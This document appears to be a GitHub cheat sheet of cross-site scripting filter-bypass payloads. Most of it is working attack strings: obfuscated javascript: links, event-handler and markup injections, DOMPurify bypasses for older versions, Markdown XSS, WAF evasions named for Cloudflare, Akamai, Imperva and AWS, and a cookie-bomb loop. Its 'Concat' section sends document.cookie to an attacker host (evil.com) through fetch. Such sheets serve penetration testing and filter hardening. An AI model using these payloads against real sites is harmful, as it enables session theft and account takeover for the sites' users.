# XSS-Bypass-Filters

### Redirection
```js
document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location=
window.location.assign()
window['location']['href']=
document.location.replace()
window.open("link", "_blank");
```

### Link

```js
//google.com/?=a
//134744072:1234/?a= (decimal ip)
```

### Cookies

```js
document.cookie 
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]
```

### Concat
```js
fetch("//evil.com/?c="+document.cookie)
fetch("//evil.com/?c=".concat(document.cookie))
fetch("//evil.com/?c=", document.cookie].join())
fetch(`//evil.com/?c=${document.cookie}`) 
```

### Href

```html
<!--javascript -->
javascript:alert(1)
JaVaScript:alert(1)
ja&Tab;vascript:alert(1)
java\tscript:alert(1)
ja&NewLine;vascript:alert(1)
ja&#x0000A;vascript:alert(1)
java&#x73;cript:alert()
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')

# tab (0x9), newline (0xa) and carriage return (0xd) allowed (inside or after the protocol) 

ja
vascript:alert(1) # New line 

jav	asc	ript	:alert(1) # Tab

# Special Characters before the protocol (Raw or encode)
# \x01-\x20 are allowed - Somes Example :
http://www.unicode-symbol.com/u/0017.html
http://www.unicode-symbol.com/u/0008.html

&#23;javascript:alert('Successful XSS') # ETB HTML
&#x8;javascript:alert(1) # Backspace HTML

# colon
javascript&colon;alert()
javascript&#x0003A;alert()
javascript&#58;alert(1)
javascript&#x3A;alert()

# javascript://
javascript://%0Aalert(1)
javascript://%0Dalert(1)

#  target="_blank"
- Scroll Click
- Shift + Click
- Ctrl + Click

# alert
javascript:alert&lpar;&rpar;
javascript:al&#x65;rt``
javascript:alert%60%60
javascript:x='%27-alert(1)-%27';
javascript:%61%6c%65%72%74%28%29

#JS unicode 
javascript:a\u006Cert``"
javascript:\u0061\u006C\u0065\u0072\u0074``
```

### HTML ENTITY

#### Named entities 
https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Named%20entities')
```
' -> &apos;
" -> &quot;
` -> &grave;
` -> &DiacriticalGrave;
( -> &lpar;
) -> &rpar;
{ -> &lcub;
} -> &rcub;
& -> &amp;
< -> &lt;
> -> &gt;
\n -> &NewLine;
\t -> &Tab;
nbsp -> &nbsp;
\ -> &bsol;
```
#### Hex entities 
[https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Hex%20entities')
```
' -> &#x27;
" -> &#x22;
` -> &#x60;
( -> &#x28;
{ -> &#x7b;
} -> &#x7d;
& -> &#x26;
< -> &#x3c;
> -> &#x3e;
\n -> &#x0a;
\t -> &#x09;
nbsp -> &#xa0;
\ -> &#x5c; 
```
#### Numeric entities
https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Numeric%20entities')
```
' -> &#39;
" -> &#34;
` -> &#96;
( -> &#40;
) -> &#41;
{ -> &#123;
} -> &#125;
& -> &#38;
< -> &#60;
> -> &#62;
\n -> &#10;
\t -> &#9;
nbsp -> &#160;
\ -> &#92;
```
#### Numeric and Hex you can add as many 0
```
( -> &#x28; = &#x0000028;
( -> &#40; = &#0000000000040;
```

### Email 
```html
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

### Iframe
```html
<iframe src="javascript:alert('XSS')"> #use href bypass
<iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
<iframe src="https://google.com@evil.domain">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
```

### Without closing tag 
```html
<img/src/onerror=alert(1)>
<svg/onload=alert(1)>
<object/data=javascript:prompt(1)>
<input/autofocus/onfocus=prompt(1)>
<audio/src/onloadstart=alert(1)>
<svg><animate/onbegin=alert(1)>
<svg><animate/dur='1s'onend=alert(1)>
<svg><set/onbegin=alert(1)>
<svg><set/dur='1ms'onend=alert(1)>
<marquee width=1 loop=1 onfinish=alert(1)>
<details/open/ontoggle=confirm(1)>
<details open ontoggle=confirm(1)>
<details/ontoggle='alert(1)'/open>
<details ontoggle=alert(1) open>

```

### Without dot 
```html
<script src=//0x8ac5c30a>
```

### Without parentheses
```js
alert`45`
document.location="javascript:alert%2845%29"
onerror=alert;throw 45
```
https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md

```js
<svg/onload='alert&#40 23 &#41'> 
location=/javascript:alert%2823%29/.source;
```
### 20 Chars MAX: 
[https://jlajara.gitlab.io/XSS_20_characters](https://jlajara.gitlab.io/XSS_20_characters)

### Some random payloads
```js
'-alert(1)-'
"-alert(1)-"
);alert(1)//
';alert(1)//
";alert(1)//
"><img/src/onerror=alert(1)>//
'><img/src/onerror=alert(1)>//
>"@input="this.alert`1`
>'@input='this.alert`1`
&quot onerror='alert(1)'
" onerror='alert(1)'
```

### In JS Injection Bypass

#### With <!-- <script/
```js
<script>
  var test = "injection <!-- <script/";
</script>

<img src="</script><script>alert(origin)</script>">
or
<input type="hidden" value="</script><script>alert(1)</script>">
or 
<a href="</script><script>alert(3)</script>" value="xxx">TEST<a>

which can be in between quotes... 
```
#### With </script>
```html
<script>
  var test = "</script><svg/onload=alert(45)>"
</script>
```

#### With </script Space, tab, strings, line return... >
```js
<script>
  var test = "</script ><svg/onload=alert(45)>"
</script>

<script>
  var test = "</script  ><svg/onload=alert(45)>"
</script>

<script>
  var test = "</script random><svg/onload=alert(45)>"
</script>

<script>
  var test = "</script
random><svg/onload=alert(45)>"
</script>

<script>
  var test = "</script 
random><svg/onload=alert(45)>"
</script>

<script>
  var test = "</script <img><svg/onload=alert(45)>"
</script>
```

#### With double quot and plus (same for simple quotes)
```js
<script>
  var test = ""+alert(45)+""
  // user input: "+alert(45)+"
</script>
```
#### With backslash
```js
<script>
  var test = "\", test1="+alert(45)//input2"
  // Original: var test = "input1", test1="input2"
  // user input1: \
  // user input2: +alert(45)//
</script>
```


### 302 XSS 
```js
ws://google.com"><svg/onload=alert(2)>
wss://google.com"><svg/onload=alert(2)>
resource://google.com"><svg/onload=alert(2)>
```
https://www.gremwell.com/firefox-xss-302<br>
https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/


### Test function 
```js
console.trace()
console.error()
console.trace``
console.error``
confirm?.(1)
top.confirm?.(1)
alert?.(1)
(a=>a(1))(alert);
setTimeout(alert, 0, 1)
[1].forEach(alert);
alert.bind()(1)
a=alert;a`1`;
alert()
alert/**/()
alert (10)
alert\n(1)
var{a:onerror}={a:alert};throw%20document.cookie
alert(1)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
eval('ale'+'rt(0)');
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();
top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);
open('java'+'script:ale'+'rt(11)');
setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
[666]["\155\141\160"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164(666)")(666)
```

## DOMPurify 

### <2.1
```js
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<math><mtext><table><mglyph><style><!--</style><img title=&quot;--></mglyph><img	src=1	onerror=alert(1)>">
```
### <2.0.1
```js
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
```

### Markdown XSS 
```md
[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[clickme](vbscript:alert(document.domain))
_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
[text](http://danlec.com " [@danlec](/danlec) ")
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
![a](https://www.google.com/image.png"onload="alert(1))
![a]("onerror="alert(1))
</http://<?php\><\h1\><script:script>confirm(2)
[XSS](.alert(1);)
[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
[ ](http://a?p=[[/onclick=alert(0) .]])
[a](javascript:new%20Function`al\ert\`1\``;)
```
## Bypass WAF

Random header bypass UA, ip ban 
https://portswigger.net/bappstore/3a656c1be14148c6bf95642af42eb854

### Bypass Amazon 

<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="250px">

Noclick
```html
<details/open/id="&quot;"ontoggle=[JS]>
```

#### Bypass AWS Post Based XSS
``Adding 8192 "A" before your payload allow you to bypass AWS WAF for POST request``

![image](https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/80288b44-4ca7-46e8-be0d-c74b47b61d17)

https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/

### Bypass Imperva & Incapsula 

<img src="https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/87b580d0-47df-4ff1-a3d4-df741f42700f" width="250px">

Noclick
```html
<details/open/id="&quot;"ontoggle=[JS]>
```

### Bypass Cloudflare

<img src="https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/829ee19e-868f-4390-877a-255f3f1ffbe6" width="250px">

Noclick
```html
<img//////src=x oNlY=1 oNerror=alert('xxs')//
<img src=x on onerror=alert()>
<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
<svg onload=prompt%26%230000000040document.domain)>
```
Href Bypass
```
<a"/onclick=(confirm)()>Click%20Here!
```

- Identify server origin
https://github.com/gwen001/cloudflare-origin-ip

### Bypass Akamai


<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Akamai_logo.svg/2560px-Akamai_logo.svg.png" width="250px">

No click
```
<details open id="' &quot;'"ontoggle=[JS]>
```

Click
```
<math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>
```



### Cookie Bomb
Can be used to demonstrate the fact of put "low" Accessibility in a CVSS
```js
for (let i = 0; i < 500; i++) {
  var a = 'A'.repeat(500);
  document.cookie = `${i}=${a}`;
}
```

## Events
```js
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforeunload
onbegin
onblur
onbounce
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfinish
onfocus
onfocusin
onfocusout
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadend
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onstart
onsubmit
ontimeupdate
ontoggle
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```
## HTML Tags
```
a
abbr
acronym
address
applet
area
article
aside
audio
b
base
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
image
img
input
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
svg -> animate
svg -> animatemotion
svg -> animatetransform
svg -> set
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
wbr
xmp
```

### SRC

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://gist.github.com/xsuperbug/1aff5c1d5ddbfefb035f33dd9c8e8a72
- https://netsec.expert/posts/xss-in-2021/#double-encoding
- https://github.com/cujanovic/Markdown-XSS-Payloads/
- https://www.hahwul.com/cullinan/xss/

